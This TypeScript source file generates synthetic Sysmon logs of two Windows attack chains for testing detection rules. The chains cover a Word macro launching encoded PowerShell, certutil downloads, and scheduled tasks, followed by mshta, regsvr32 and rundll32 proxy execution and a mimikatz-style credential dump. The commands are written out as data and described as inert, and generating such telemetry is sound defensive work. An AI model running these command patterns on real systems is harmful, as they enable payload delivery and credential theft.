/**
 * Windows attack scenarios (S5), recorded by Sysmon on the two workstations. Each command
 * line was written against the SigmaHQ rule named in its comment and only needs to satisfy
 * that rule: every one is inert. Addresses are documentation ranges, the encoded command
 * only prints a sentence, the "downloads" are text files, the scheduled task opens
 * Notepad and the credential tool is a file name, not a tool.
 *
 * - `ws-0142` (Marisol Condori, sales): a macro document makes Word start PowerShell,
 *   which runs an encoded command, downloads with certutil and adds a scheduled task.
 * - `ws-0187` (Julio Mamani, finance): a remote HTA through mshta, a scriptlet through
 *   regsvr32, a DLL-like file through rundll32, then a credential-dumping command line.
 */
import { Buffer } from 'node:buffer';
import { US_PER_SECOND } from './linux.js';
import { Random } from './prng.js';
import type { ScenarioContext, ScenarioMeta } from './scenarios.js';
import { IMAGES, SysmonWriter, unsignedImage, WORKSTATIONS } from './windows.js';

const S = US_PER_SECOND;

/** Seconds between steps, plus a sub-second part (Sysmon times have milliseconds). */
function after(rng: Random, minSeconds: number, maxSeconds: number): number {
  return rng.int(minSeconds, maxSeconds) * S + rng.int(1_000, 999_000);
}

/** Attacker infrastructure (documentation range, ARCHITECTURE §4.3). */
const DROP_SERVER = '203.0.113.50';
const HTA_SERVER = '203.0.113.60';

export const WINDOWS_SCENARIOS: readonly ScenarioMeta[] = [
  {
    id: 'office-macro-powershell',
    host: 'ws-0142',
    techniques: ['T1566.001', 'T1204.002', 'T1059.001'],
    entities: { ips: [], users: ['m.condori'] },
    expected: ['proc_creation_win_office_susp_child_processes'],
  },
  {
    id: 'encoded-powershell',
    host: 'ws-0142',
    techniques: ['T1059.001', 'T1027'],
    entities: { ips: [], users: ['m.condori'] },
    expected: ['proc_creation_win_powershell_encode'],
  },
  {
    id: 'certutil-download',
    host: 'ws-0142',
    techniques: ['T1105'],
    entities: { ips: [DROP_SERVER], users: ['m.condori'] },
    expected: [
      'proc_creation_win_certutil_download',
      'proc_creation_win_certutil_download_direct_ip',
      'centinela-win-lolbin-network-connection',
      'centinela-win-lolbin-file-drop',
    ],
  },
  {
    id: 'scheduled-task',
    host: 'ws-0142',
    techniques: ['T1053.005'],
    entities: { ips: [], users: ['m.condori'] },
    expected: ['proc_creation_win_schtasks_creation', 'proc_creation_win_schtasks_env_folder'],
  },
  {
    id: 'mshta-remote-hta',
    host: 'ws-0187',
    techniques: ['T1218.005'],
    entities: { ips: [HTA_SERVER], users: ['j.mamani'] },
    expected: ['proc_creation_win_mshta_http', 'centinela-win-lolbin-network-connection'],
  },
  {
    id: 'regsvr32-scriptlet',
    host: 'ws-0187',
    techniques: ['T1218.010'],
    entities: { ips: [HTA_SERVER], users: ['j.mamani'] },
    expected: ['proc_creation_win_regsvr32_network_pattern'],
  },
  {
    id: 'rundll32-proxy',
    host: 'ws-0187',
    techniques: ['T1218.011'],
    entities: { ips: [], users: ['j.mamani'] },
    expected: ['proc_creation_win_rundll32_uncommon_dll_extension'],
  },
  {
    id: 'credential-dumping',
    host: 'ws-0187',
    techniques: ['T1003.001'],
    entities: { ips: [], users: ['j.mamani'] },
    expected: ['proc_creation_win_hktl_mimikatz_command_line'],
  },
];

/** When each Windows chain starts, in hours after the start of a 3-day run (Lima working hours). */
export const WINDOWS_SCHEDULE_HOURS: Readonly<Record<string, number>> = {
  /** office-macro-powershell, then encoded-powershell, certutil-download, scheduled-task. */
  'office-macro-powershell': 38.6,
  /** mshta-remote-hta, then regsvr32-scriptlet, rundll32-proxy, credential-dumping. */
  'mshta-remote-hta': 63.2,
};

/** PowerShell's `-EncodedCommand` takes base64 of the UTF-16LE script text. */
export function encodePowerShell(script: string): string {
  return Buffer.from(script, 'utf16le').toString('base64');
}

/** Word opens a macro document from Downloads; the chain continues from its PowerShell. */
function officeMacroChain(ctx: ScenarioContext, startUs: number): void {
  const rng = Random.for(ctx.seed, 'scenario:office-macro-chain');
  const ws = WORKSTATIONS['ws-0142'];
  const writer = (id: string) => new SysmonWriter(ctx.out(id), ws, rng);
  const home = `C:\\Users\\${ws.user}`;
  const document = `${home}\\Downloads\\factura-octubre.docm`;

  // proc_creation_win_office_susp_child_processes: ParentImage ends with \WINWORD.EXE and
  // Image ends with \powershell.exe.
  const macro = writer('office-macro-powershell');
  const shell = macro.shell();
  const word = macro.process(
    startUs,
    IMAGES.winword,
    `"${IMAGES.winword.path}" /n "${document}" /o ""`,
    shell,
  );
  macro.createFile(startUs + after(rng, 2, 4), word, `${home}\\Downloads\\~$ctura-octubre.docm`);
  const stage1 = macro.process(
    startUs + after(rng, 20, 35),
    IMAGES.powershell,
    `powershell.exe -NoProfile -Command "Write-Output 'Centinela demo: macro stage'"`,
    word,
    { currentDirectory: `${home}\\Documents\\` },
  );

  // proc_creation_win_powershell_encode: Image ends with \powershell.exe and CommandLine
  // contains ' -enco' (case-insensitive); the payload decodes to a Write-Output line.
  const encoded = writer('encoded-powershell');
  const encodedUs = startUs + after(rng, 60, 90);
  const stage2 = encoded.process(
    encodedUs,
    IMAGES.powershell,
    `powershell.exe -NoProfile -NonInteractive -EncodedCommand ${encodePowerShell("Write-Output 'Centinela demo: encoded stage'")}`,
    stage1,
    { currentDirectory: `${home}\\Documents\\` },
  );

  // proc_creation_win_certutil_download(_direct_ip): certutil.exe with 'urlcache ' and
  // 'http' ('://2' for the direct IP). Centinela's rules see the connection and the file.
  const download = writer('certutil-download');
  const downloadUs = encodedUs + after(rng, 70, 110);
  const target = 'C:\\Users\\Public\\Downloads\\inventario.txt';
  const certutil = download.process(
    downloadUs,
    IMAGES.certutil,
    `certutil.exe -urlcache -split -f http://${DROP_SERVER}/inventario.txt ${target}`,
    stage2,
  );
  download.connect(downloadUs + rng.int(300_000, 600_000), certutil, {
    ip: DROP_SERVER,
    port: 80,
    portName: 'http',
  });
  download.createFile(downloadUs + rng.int(900_000, 1_500_000), certutil, target);

  // proc_creation_win_schtasks_creation: schtasks.exe with ' /create ' by a user that is
  // not SYSTEM; proc_creation_win_schtasks_env_folder: also ':\Users\Public'.
  const task = writer('scheduled-task');
  task.process(
    downloadUs + after(rng, 90, 140),
    IMAGES.schtasks,
    `schtasks.exe /Create /SC DAILY /ST 09:00 /TN "AndesInventario" /TR "notepad.exe ${target}" /F`,
    stage2,
  );
}

/** A finance user opens a link to an HTA; the "loader" then tries three proxies. */
function proxyExecutionChain(ctx: ScenarioContext, startUs: number): void {
  const rng = Random.for(ctx.seed, 'scenario:proxy-execution-chain');
  const ws = WORKSTATIONS['ws-0187'];
  const writer = (id: string) => new SysmonWriter(ctx.out(id), ws, rng);
  const http = { port: 80, portName: 'http' };

  // proc_creation_win_mshta_http: mshta.exe with 'http://' in the command line.
  const hta = writer('mshta-remote-hta');
  const mshta = hta.process(
    startUs,
    IMAGES.mshta,
    `"${IMAGES.mshta.path}" http://${HTA_SERVER}/aviso-pago.hta`,
    hta.shell(),
  );
  hta.connect(startUs + rng.int(300_000, 800_000), mshta, { ip: HTA_SERVER, ...http });

  // proc_creation_win_regsvr32_network_pattern: regsvr32.exe with ' /i' and 'http'.
  const scriptlet = writer('regsvr32-scriptlet');
  const regsvrUs = startUs + after(rng, 40, 70);
  const regsvr32 = scriptlet.process(
    regsvrUs,
    IMAGES.regsvr32,
    `regsvr32.exe /s /n /u /i:http://${HTA_SERVER}/demo.sct scrobj.dll`,
    mshta,
  );
  scriptlet.connect(regsvrUs + rng.int(300_000, 800_000), regsvr32, { ip: HTA_SERVER, ...http });

  // proc_creation_win_rundll32_uncommon_dll_extension: rundll32.exe whose command line
  // names no .dll, .cpl or .inf file.
  const proxy = writer('rundll32-proxy');
  proxy.process(
    regsvrUs + after(rng, 120, 180),
    IMAGES.rundll32,
    'rundll32.exe C:\\Users\\Public\\Downloads\\aviso.dat,DllRegisterServer',
    mshta,
  );

  // proc_creation_win_hktl_mimikatz_command_line: module names such as 'sekurlsa::' in
  // the command line. mk.exe is only a name here; nothing in the data is executable.
  const dump = writer('credential-dumping');
  const elevatedUs = regsvrUs + after(rng, 360, 480);
  const cmd = dump.process(elevatedUs, IMAGES.cmd, `"${IMAGES.cmd.path}" `, dump.shell(), {
    integrity: 'High',
  });
  dump.process(
    elevatedUs + after(rng, 30, 60),
    unsignedImage('C:\\Users\\Public\\Downloads\\mk.exe'),
    'mk.exe "privilege::debug" "sekurlsa::logonpasswords" exit',
    cmd,
    { currentDirectory: 'C:\\Users\\Public\\Downloads\\' },
  );
}

export const WINDOWS_SCENARIO_GENERATORS: Readonly<
  Record<string, (ctx: ScenarioContext, startUs: number) => void>
> = {
  'office-macro-powershell': officeMacroChain,
  'mshta-remote-hta': proxyExecutionChain,
};
